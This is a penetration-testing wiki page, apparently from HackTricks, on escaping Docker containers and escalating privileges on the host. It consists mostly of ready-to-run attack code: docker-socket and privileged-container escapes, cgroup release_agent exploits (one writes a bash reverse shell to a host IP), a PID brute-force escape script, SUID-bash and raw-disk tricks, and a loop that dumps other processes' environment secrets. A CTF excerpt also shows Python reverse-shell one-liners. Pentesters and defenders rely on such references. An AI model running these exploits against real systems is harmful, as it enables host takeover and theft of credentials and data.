# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Automatic Enumeration & Escape

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
- [**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
- [**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
- [**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image

## Mounted Docker Socket Escape

If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.

```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```

In this case you can use regular docker commands to communicate with the docker daemon:

```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```

> [!TIP]
> In case the **docker socket is in an unexpected place** you can still communicate with it using the **`docker`** command with the parameter **`-H unix:///path/to/docker.sock`**

Docker daemon might be also [listening in a port (by default 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) or on Systemd-based systems, communication with the Docker daemon can occur over the Systemd socket `fd://`.

> [!TIP]
> Additionally, pay attention to the runtime sockets of other high-level runtimes:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Capabilities Abuse Escape

You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

You can check currently container capabilities using **previously mentioned automatic tools** or:

```bash
capsh --print
```

In the following page you can **learn more about linux capabilities** and how to abuse them to escape/escalate privileges:


{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Escape from Privileged Containers

A privileged container can be created with the flag `--privileged` or disabling specific defenses:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

The `--privileged` flag significantly lowers container security, offering **unrestricted device access** and bypassing **several protections**. For a detailed breakdown, refer to the documentation on `--privileged`'s full impacts.


{{#ref}}
../docker-privileged.md
{{#endref}}

### Privileged + hostPID

With these permissions you can just **move to the namespace of a process running in the host as root** like init (pid:1) just running: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Test it in a container executing:

```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```

### Privileged

Just with the privileged flag you can try to **access the host's disk** or try to **escape abusing release_agent or other escapes**.

Test the following bypasses in a container executing:

```bash
docker run --rm -it --privileged ubuntu bash
```

#### Mounting Disk - Poc1

Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

So to take over the host machine, it is trivial:

```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```

And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.

#### Mounting Disk - Poc2

Within the container, an attacker may attempt to gain further access to the underlying host OS via a writable hostPath volume created by the cluster. Below is some common things you can check within the container to see if you leverage this attacker vector:

```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```

#### Privileged Escape Abusing existent release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1

```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```

#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2

```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

Find an **explanation of the technique** in:


{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Privileged Escape Abusing release_agent without known the relative path - PoC3

In the previous exploits the **absolute path of the container inside the hosts filesystem is disclosed**. However, this isn’t always the case. In cases where you **don’t know the absolute path of the container inside the host** you can use this technique:


{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```

Executing the PoC within a privileged container should provide output similar to:

```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```

#### Privileged Escape Abusing Sensitive Mounts

There are several files that might mounted that give **information about the underlaying host**. Some of them may even indicate **something to be executed by the host when something happens** (which will allow a attacker to escape from the container).\
The abuse of these files may allow that:

- release_agent (already covered before)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

However, you can find **other sensitive files** to check for in this page:


{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbitrary Mounts

In several occasions you will find that the **container has some volume mounted from the host**. If this volume wasn’t correctly configured you might be able to **access/modify sensitive data**: Read secrets, change ssh authorized_keys…

```bash
docker run --rm -it -v /:/host ubuntu bash
```

Another interesting example can be found in [**this blog**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce) where it's indicated that the host's `/usr/bin/` and `/bin/` folders are mounted inside the container allowing the root user of the container to modify binaries inside these folders. Therefore, if a cron job is using any binary from there, like `/etc/cron.d/popularity-contest` this allows to escape from the container by modifying a binary used by the cron job.

### Privilege Escalation with 2 shells and host mount

If you have access as **root inside a container** that has some folder from the host mounted and you have **escaped as a non privileged user to the host** and have read access over the mounted folder.\
You can create a **bash suid file** in the **mounted folder** inside the **container** and **execute it from the host** to privesc.

```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```

### Privilege Escalation with 2 shells

If you have access as **root inside a container** and you have **escaped as a non privileged user to the host**, you can abuse both shells to **privesc inside the host** if you have the capability MKNOD inside the container (it's by default) as [**explained in this post**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
With such capability the root user within the container is allowed to **create block device files**. Device files are special files that are used to **access underlying hardware & kernel modules**. For example, the /dev/sda block device file gives access to **read the raw data on the systems disk**.

Docker safeguards against block device misuse within containers by enforcing a cgroup policy that **blocks block device read/write operations**. Nevertheless, if a block device is **created inside the container**, it becomes accessible from outside the container via the **/proc/PID/root/** directory. This access requires the **process owner to be the same** both inside and outside the container.

**Exploitation** example from this [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):

```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```

### hostPID

If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run test lab:

```
docker run --rm -it --pid=host ubuntu bash
```

For example, you will be able to list the processes using something like `ps auxn` and search for sensitive details in the commands.

Then, as you can **access each process of the host in /proc/ you can just steal their env secrets** running:

```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```

You can also **access other processes file descriptors and read their open files**:

```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```

You can also **kill processes and cause a DoS**.

> [!WARNING]
> If you somehow have privileged **access over a process outside of the container**, you could run something like `nsenter --target <pid> --all` or `nsenter --target <pid> --mount --net --pid --cgroup` to **run a shell with the same ns restrictions** (hopefully none) **as that process.**

### hostNetwork

```
docker run --rm -it --network=host ubuntu bash
```

If a container was configured with the Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated. In other words, the **container binds all services directly to the host's IP**. Furthermore the container can **intercept ALL network traffic that the host** is sending and receiving on shared interface `tcpdump -i eth0`.

For instance, you can use this to **sniff and even spoof traffic** between host and metadata instance.

Like in the following examples:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

You will be able also to access **network services binded to localhost** inside the host or even access the **metadata permissions of the node** (which might be different those a container can access).

### hostIPC

```bash
docker run --rm -it --ipc=host ubuntu bash
```

With `hostIPC=true`, you gain access to the host's inter-process communication (IPC) resources, such as **shared memory** in `/dev/shm`. This allows reading/writing where the same IPC resources are used by other host or pod processes. Use `ipcs` to inspect these IPC mechanisms further.

- **Inspect /dev/shm** - Look for any files in this shared memory location: `ls -la /dev/shm`
- **Inspect existing IPC facilities** – You can check to see if any IPC facilities are being used with `/usr/bin/ipcs`. Check it with: `ipcs -a`

### Recover capabilities

If the syscall **`unshare`** is not forbidden you can recover all the capabilities running:

```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```

### User namespace abuse via symlink

The second technique explained in the post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indicates how you can abuse bind mounts with user namespaces, to affect files inside the host (in that specific case, delete files).

## CVEs

### Runc exploit (CVE-2019-5736)

In case you can execute `docker exec` as root (probably with sudo), you try to escalate privileges escaping from a container abusing CVE-2019-5736 (exploit [here](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). This technique will basically **overwrite** the _**/bin/sh**_ binary of the **host** **from a container**, so anyone executing docker exec may trigger the payload.

Change the payload accordingly and build the main.go with `go build main.go`. The resulting binary should be placed in the docker container for execution.\
Upon execution, as soon as it displays `[+] Overwritten /bin/sh successfully` you need to execute the following from the host machine:

`docker exec -it <container-name> /bin/sh`

This will trigger the payload which is present in the main.go file.

For more information: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!TIP]
> There are other CVEs the container can be vulnerable too, you can find a list in [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Custom Escape

### Docker Escape Surface

- **Namespaces:** The process should be **completely separated from other processes** via namespaces, so we cannot escape interacting with other procs due to namespaces (by default cannot communicate via IPCs, unix sockets, network svcs, D-Bus, `/proc` of other procs).
- **Root user**: By default the user running the process is the root user (however its privileges are limited).
- **Capabilities**: Docker leaves the following capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: These are the syscalls that the **root user won't be able to call** (because of lacking capabilities + Seccomp). The other syscalls could be used to try to escape.

{{#tabs}}
{{#tab name="x64 syscalls"}}

```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```

{{#endtab}}

{{#tab name="arm64 syscalls"}}

```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```

{{#endtab}}

{{#tab name="syscall_bf.c"}}

````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
    for(int i = 0; i < 333; ++i)
    {
        if(i == SYS_rt_sigreturn) continue;
        if(i == SYS_select) continue;
        if(i == SYS_pause) continue;
        if(i == SYS_exit_group) continue;
        if(i == SYS_exit) continue;
        if(i == SYS_clone) continue;
        if(i == SYS_fork) continue;
        if(i == SYS_vfork) continue;
        if(i == SYS_pselect6) continue;
        if(i == SYS_ppoll) continue;
        if(i == SYS_seccomp) continue;
        if(i == SYS_vhangup) continue;
        if(i == SYS_reboot) continue;
        if(i == SYS_shutdown) continue;
        if(i == SYS_msgrcv) continue;
        printf("Probando: 0x%03x . . . ", i); fflush(stdout);
        if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
            printf("Error\n");
        else
            printf("OK\n");
    }
}
```
````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
  - You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
  - You should be able to **execute the trigger from inside the host**
  - You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
  - You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}


